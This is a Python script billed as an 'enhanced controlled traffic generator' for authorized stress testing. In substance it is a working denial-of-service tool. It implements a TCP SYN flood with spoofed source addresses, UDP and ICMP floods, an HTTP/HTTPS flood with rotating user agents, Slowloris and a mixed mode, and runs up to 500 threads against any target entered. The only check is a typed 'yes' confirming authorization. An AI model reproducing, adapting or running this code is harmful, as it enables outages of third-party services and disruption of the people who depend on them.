#!/usr/bin/env python3
"""
ENHANCED CONTROLLED TRAFFIC GENERATOR
A sophisticated tool for comprehensive network stress testing and ethical resilience assessment.
"""

import socket
import random
import time
import threading
import struct
import ipaddress
import ssl
import http.client
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed

class TrafficGenerator:
    def __init__(self):
        self.attack_running = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'successful_connections': 0,
            'failed_connections': 0,
            'start_time': None
        }
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Mozilla/5.0 (Android 10; Mobile) AppleWebKit/537.36'
        ]

    def create_tcp_socket(self):
        """Create and configure TCP socket"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            return s
        except Exception as e:
            self.stats['failed_connections'] += 1
            return None

    def create_udp_socket(self):
        """Create and configure UDP socket"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            return s
        except Exception as e:
            self.stats['failed_connections'] += 1
            return None

    def generate_payload(self, size=1024):
        """Generate random payload data"""
        return random.getrandbits(8 * size).to_bytes(size, 'big')

    def tcp_syn_flood(self, target, port, thread_id):
        """Advanced TCP SYN flood with IP spoofing"""
        while self.attack_running:
            try:
                # Generate spoofed source IP
                src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Create raw socket for SYN packets (requires root)
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                except:
                    # Fallback to normal socket if no root privileges
                    s = self.create_tcp_socket()
                    if s:
                        s.connect((target, port))
                        s.send(self.generate_payload(512))
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_sent'] += 512
                        s.close()
                    continue
                
                # Craft TCP SYN packet
                source_port = random.randint(1024, 65535)
                seq_num = random.randint(0, 4294967295)
                
                # TCP header (simplified)
                tcp_header = struct.pack('!HHLLBBHHH', 
                    source_port, port,    # Source/dest ports
                    seq_num, 0,           # Sequence number, ACK number
                    5 << 4, 2,            # Data offset, SYN flag
                    8192, 0, 0)           # Window, checksum, urgent pointer
                
                s.sendto(tcp_header, (target, port))
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(tcp_header)
                s.close()
                
            except Exception as e:
                self.stats['failed_connections'] += 1
                time.sleep(0.1)

    def udp_flood_advanced(self, target, port, thread_id):
        """Enhanced UDP flood with variable payload sizes"""
        payload_sizes = [64, 128, 256, 512, 1024, 2048]
        s = self.create_udp_socket()
        
        while self.attack_running and s:
            try:
                payload_size = random.choice(payload_sizes)
                payload = self.generate_payload(payload_size)
                s.sendto(payload, (target, port))
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += payload_size
            except Exception as e:
                self.stats['failed_connections'] += 1
                # Recreate socket if needed
                s = self.create_udp_socket()

    def http_flood_advanced(self, target, port, thread_id):
        """Advanced HTTP flood with multiple request types and HTTPS support"""
        paths = ['/', '/index.html', '/api/v1/test', '/admin', '/images/logo.png']
        methods = ['GET', 'POST', 'PUT', 'DELETE']
        
        use_https = port == 443
        
        while self.attack_running:
            try:
                if use_https:
                    conn = http.client.HTTPSConnection(target, port, timeout=10)
                else:
                    conn = http.client.HTTPConnection(target, port, timeout=10)
                
                method = random.choice(methods)
                path = random.choice(paths)
                user_agent = random.choice(self.user_agents)
                
                headers = {
                    'User-Agent': user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Connection': 'keep-alive'
                }
                
                if method == 'POST':
                    headers['Content-Type'] = 'application/x-www-form-urlencoded'
                    post_data = urllib.parse.urlencode({
                        'data': random.randint(1000, 9999),
                        'timestamp': int(time.time())
                    })
                    conn.request(method, path, post_data, headers)
                else:
                    conn.request(method, path, headers=headers)
                
                response = conn.getresponse()
                conn.close()
                
                self.stats['packets_sent'] += 1
                self.stats['successful_connections'] += 1
                self.stats['bytes_sent'] += 100  # Approximate request size
                
            except Exception as e:
                self.stats['failed_connections'] += 1
                time.sleep(0.5)

    def slowloris_advanced(self, target, port, thread_id):
        """Enhanced Slowloris attack with multiple connections per thread"""
        sockets = []
        max_sockets = 50
        
        while self.attack_running:
            try:
                # Maintain pool of sockets
                while len(sockets) < max_sockets and self.attack_running:
                    s = self.create_tcp_socket()
                    if s:
                        try:
                            s.connect((target, port))
                            # Send partial headers
                            headers = f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\n"
                            headers += f"Host: {target}\r\n"
                            headers += "User-Agent: {}\r\n".format(random.choice(self.user_agents))
                            headers += "Content-Length: 42\r\n"
                            s.send(headers.encode())
                            sockets.append(s)
                            self.stats['successful_connections'] += 1
                        except:
                            self.stats['failed_connections'] += 1
                
                # Keep connections alive with partial data
                for s in sockets[:]:
                    try:
                        # Send additional headers periodically
                        if random.random() < 0.1:
                            s.send(f"X-a: {random.randint(1000, 9999)}\r\n".encode())
                            self.stats['packets_sent'] += 1
                    except:
                        sockets.remove(s)
                        self.stats['failed_connections'] += 1
                
                time.sleep(10)  # Slow sending interval
                
            except Exception as e:
                self.stats['failed_connections'] += 1
                time.sleep(1)
        
        # Cleanup
        for s in sockets:
            try:
                s.close()
            except:
                pass

    def icmp_flood(self, target, port, thread_id):
        """ICMP flood (ping flood) - requires root privileges"""
        while self.attack_running:
            try:
                # Create raw socket for ICMP (requires root)
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                
                # Craft ICMP echo request packet
                icmp_type = 8  # Echo Request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(0, 65535)
                icmp_seq = random.randint(0, 65535)
                
                # ICMP header
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, 
                                        icmp_checksum, icmp_id, icmp_seq)
                
                # Add payload
                payload = self.generate_payload(56)  # Standard ping payload size
                packet = icmp_header + payload
                
                s.sendto(packet, (target, 0))  # ICMP doesn't use ports
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                s.close()
                
            except Exception as e:
                # Fallback to normal ping if no root privileges
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(self.generate_payload(64), (target, port))
                    self.stats['packets_sent'] += 1
                    self.stats['bytes_sent'] += 64
                    s.close()
                except:
                    self.stats['failed_connections'] += 1
                time.sleep(0.01)

    def mixed_attack(self, target, port, thread_id):
        """Mixed attack - combines multiple techniques"""
        attacks = [self.tcp_syn_flood, self.udp_flood_advanced, self.http_flood_advanced]
        
        while self.attack_running:
            attack_func = random.choice(attacks)
            try:
                attack_func(target, port, thread_id)
                time.sleep(0.1)
            except:
                self.stats['failed_connections'] += 1

    def print_stats(self):
        """Print real-time statistics"""
        start_time = self.stats['start_time']
        while self.attack_running:
            elapsed = time.time() - start_time
            packets_per_sec = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            mb_sent = self.stats['bytes_sent'] / (1024 * 1024)
            
            print(f"\r\033[97m[*] Time: {elapsed:.1f}s | "
                  f"Packets: {self.stats['packets_sent']} | "
                  f"Rate: {packets_per_sec:.1f} pps | "
                  f"Data: {mb_sent:.2f} MB | "
                  f"Success: {self.stats['successful_connections']} | "
                  f"Failed: {self.stats['failed_connections']}\033[0m", 
                  end='', flush=True)
            time.sleep(1)

def run():
    generator = TrafficGenerator()
    
    print("\033[92m" + "="*80)
    print("           ENHANCED CONTROLLED TRAFFIC GENERATOR - Advanced DoS Simulation")
    print("="*80 + "\033[0m\n")
    
    print("\033[91m[!] CRITICAL WARNING: Use only for authorized testing!\033[0m")
    print("\033[91m[!] Unauthorized DoS attacks are illegal and unethical.\033[0m")
    print("\033[91m[!] Some features require root/administrator privileges.\033[0m\n")
    
    # Target configuration
    target = input("\033[97m[?] Enter target IP or domain: \033[0m").strip()
    port_input = input("\033[97m[?] Enter target port (default: 80): \033[0m").strip()
    port = int(port_input) if port_input.isdigit() else 80
    
    # Validate target
    try:
        socket.gethostbyname(target)
    except socket.gaierror:
        print("\033[91m[!] Invalid target address.\033[0m")
        return
    
    print("\n\033[97m[*] Enhanced Attack Types:\033[0m")
    print("  [1] TCP SYN Flood (Advanced)")
    print("  [2] UDP Flood (Variable Payload)")
    print("  [3] ICMP Flood (Ping Flood)")
    print("  [4] HTTP/HTTPS Flood (Advanced)")
    print("  [5] Slowloris (Advanced)")
    print("  [6] Mixed Attack (Combined)")
    
    attack_type = input("\n\033[95m[?] Select attack type: \033[0m").strip()
    
    # Thread configuration
    threads_num = input("\033[97m[?] Number of threads (1-500, default 50): \033[0m").strip()
    threads_num = int(threads_num) if threads_num.isdigit() and 1 <= int(threads_num) <= 500 else 50
    
    # Duration (optional)
    duration = input("\033[97m[?] Duration in seconds (0 for unlimited): \033[0m").strip()
    duration = int(duration) if duration.isdigit() else 0
    
    # Final confirmation
    print(f"\n\033[93m[*] Configuration Summary:")
    print(f"    Target: {target}:{port}")
    print(f"    Attack Type: {attack_type}")
    print(f"    Threads: {threads_num}")
    print(f"    Duration: {duration if duration > 0 else 'unlimited'} seconds\033[0m")
    
    confirm = input("\n\033[93m[?] Confirm you are authorized to test this target (yes/no): \033[0m").strip().lower()
    if confirm != 'yes':
        print("\033[91m[!] Attack cancelled.\033[0m")
        return
    
    # Initialize attack
    generator.attack_running = True
    generator.stats['start_time'] = time.time()
    
    print(f"\n\033[92m[*] Starting enhanced traffic generation with {threads_num} threads...\033[0m")
    print("\033[93m[*] Press Ctrl+C to stop\033[0m\n")
    
    try:
        # Start statistics thread
        stats_thread = threading.Thread(target=generator.print_stats)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start attack threads
        attack_methods = {
            '1': generator.tcp_syn_flood,
            '2': generator.udp_flood_advanced,
            '3': generator.icmp_flood,
            '4': generator.http_flood_advanced,
            '5': generator.slowloris_advanced,
            '6': generator.mixed_attack
        }
        
        attack_func = attack_methods.get(attack_type)
        if not attack_func:
            print("\033[91m[!] Invalid attack type.\033[0m")
            return
        
        with ThreadPoolExecutor(max_workers=threads_num) as executor:
            futures = [
                executor.submit(attack_func, target, port, i) 
                for i in range(threads_num)
            ]
            
            # Handle duration limit
            if duration > 0:
                time.sleep(duration)
                generator.attack_running = False
            else:
                # Wait for keyboard interrupt
                while True:
                    time.sleep(1)
                    
    except KeyboardInterrupt:
        print("\n\n\033[92m[*] Stopping traffic generation...\033[0m")
    
    finally:
        generator.attack_running = False
        time.sleep(2)  # Allow threads to clean up
        
        # Final statistics
        elapsed = time.time() - generator.stats['start_time']
        packets_per_sec = generator.stats['packets_sent'] / elapsed if elapsed > 0 else 0
        mb_sent = generator.stats['bytes_sent'] / (1024 * 1024)
        
        print(f"\n\033[92m[*] Attack Complete:")
        print(f"    Total Duration: {elapsed:.2f} seconds")
        print(f"    Total Packets: {generator.stats['packets_sent']}")
        print(f"    Average Rate: {packets_per_sec:.2f} packets/second")
        print(f"    Data Sent: {mb_sent:.2f} MB")
        print(f"    Successful Connections: {generator.stats['successful_connections']}")
        print(f"    Failed Connections: {generator.stats['failed_connections']}\033[0m")

if __name__ == "__main__":
    run()